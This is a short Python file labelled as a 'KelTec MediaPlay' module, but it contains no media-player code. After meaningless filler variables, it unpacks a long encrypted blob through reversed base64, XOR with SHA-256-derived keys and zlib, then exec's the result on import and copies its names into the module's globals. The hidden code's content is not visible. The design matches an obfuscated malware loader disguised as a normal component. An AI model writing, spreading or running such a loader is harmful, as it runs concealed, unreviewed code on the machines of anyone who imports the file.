# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 394274 ^ 998185
_lx1_1 = len("e61bba")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-644301)
_lx3_3 = 158076 * 0
_lx4_4 = 137065 ^ 639478
_K = 'bcd13800d28a675d780cabddb96d76ddd1eec4a895cbad39d670663ab125414d'
_M = 'lzQEgpJse3Mc6Q=='
_D = '=YUJ2OecOYqTLEtH+syG5EAgNxmswzW83EvQRRxq57iwPJdt+uN5Je7ltnLSQxpWIxhBggVieU9vitbdl4t/W4STXNrAX2HKxuLMQXHpSFsrWFs0HwRqf2Bge/Ztj81sJUmUtt5q+/bNxHphZn3eVdcBtHzjEHMNOpRYVhE9Vqg6lDQbLy3kzuwjDv8zhm7s7Ctuwt0yPwR76liD38PDCEjgPxQ8NbNYKZn1vnx5/131BjDEibfKO0t687dhDSrckzCVcJ/4fpHvzM6EDa5WuMA32RCQ97+VdB3DBZ3KJgVUKPAAtj6a91rrkl9RdkIGqmbnhkHbAzwt4zGY7z7N+WgMquYUjCs+PgMjceGieV/p4GzwCawRGejw0vabovc/mt/8/h3c3WJHiF8Xalw4QTnjKh/v8AG0ot8imnrflF7QW5DuZBOtF7fKBqxYpZRQglsOopgYzUwOMkFQMveywmWGgGyD2av8q+MwWquuOadIGFEdNqCHi/66bPl5UxDqR7LIjZgJ4TCG8cRPvL4+YcjXkFRRQ6er9nxZMUgrrCT9SvtJ/IVp+yiE+xIf3Q70OtUjhe/0jwesEFj8ABpdvHTl+9i46gDNiJ2jdWAUvItlJlY++FwkzZgqHCJ2WBJbS9YPhSXvbPt1UTFQ3PvoQ+I4RZ9hoUXIKMPd/V4HgSTLo62JoNAp7bsPvpnliLFLu6HYgvwV4YO/qMtCAhL5m8oL9tScWGGd3vdg35EUXrvyUNvmqQY8f6urirPoZZtEjq/O7BKA9rqi1C7PhlnE0pjNSpWZGB+yuUBdUWTe29WqoVJ6dvVBoQ08Tjdgwk1tKxhGoRqOnBT7rswGjSfR4gYrL2qHLKIZ5eUv6gRXgh/AaZyHY5X+Vq0sJqFTSDNkyOV5Ff/x9q6R4le+BKaXX/vm0IPPBR4ZbsFqIS32fgE1aioBYUxxRuaARfYC38pSpzqg8dUSxuFkkyN2XaIeeZEkOIob5xALCx27g1gSY0FXbl1YdRA4qFPngURrQpN4xvom0ZyhnUc4kRG1XYw61GFJBBRyVP8pBHe42rD1lBoXj2b1rvFO7hiuUQyyCQ+aLuT3qACa05IZm9yYspwpd1wIyIYr00gC+ZBEfa/kUnrX9DwtCszx/kKjDOWJYRwCnnoujQA9DAHUYlpbjvaHQzD50JQNKC5dcjHEqb1X7wsPeINftCl2AjUnzNEXwEPY4ir8Vs0AoYbOg+vHJh2Iu/PBVbYSDtAKL93lSdxZBnFXFwjA/WqkM59wpMJIEaZj0iP+Ahf6Uk/357o+MyrjrwxBz/4jgFmaYpc4edySRdxvY408T5bs7aY01JQU+lOlWNrO1NxMRCQX9RWxZE4IEV6BDKvskN+GfN1Mkt2B1esMMoZ5GcM2vJUkvS4L820RhmFDv8zIt36Msh5hZHnE9Y+j8iqJo+Ug5azbn2eprukNiMug62jrJjZDPIb/L0+ipO8C9USeSGDJfJv7un4VLOstSx9LA0Ayl2+eUoycreMqoT71esJYyJGLa29IgLea4veE+ubSWeSug4RFtXPjhM/+ySoNt6xc8e01LyD+aG1cbtSIqytHB2WZLrlVG+nJkxdJkK2auO1vmrwFwm8s7DLeK3Tr7/qOaan8mQAjj4+uizvtHSfdMplKOn4/RWYjgEQ6d4uMw3A87wTa20M+U36qrl0/ZzJK1p1e8B6Ur29XuzFPik2M+Jyo//tsy4aJ2G9A0mUmO9b+hGrPUSnYhiqvnwZcQY0lhE4jOGEnRFFdyW/I8S4kpouLUnW3lsQDAGVj9K1YxvgdF83AbLbyO/d7o84ESZSF/XNz'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
